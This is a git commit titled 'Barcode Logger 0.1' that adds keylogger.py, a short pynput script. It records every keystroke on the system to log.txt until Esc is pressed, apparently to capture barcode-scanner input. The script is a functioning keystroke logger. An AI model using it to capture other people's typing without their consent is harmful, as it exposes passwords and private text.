a1db00fec3409de996cbf7defed8b4270b993680
yuval <yuvaldo10@gmail.com>
2021-08-12 22:48:19 +0300

    Barcode Logger 0.1

---
+++ keylogger.py
@@ -0,0 +1,35 @@
+import pynput
+from pynput.keyboard import Key, Listener
+count = 0
+keys = []
+
+
+def write_file(keys):
+    with open('log.txt', 'a') as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("enter") > 0:
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+    
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+    
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
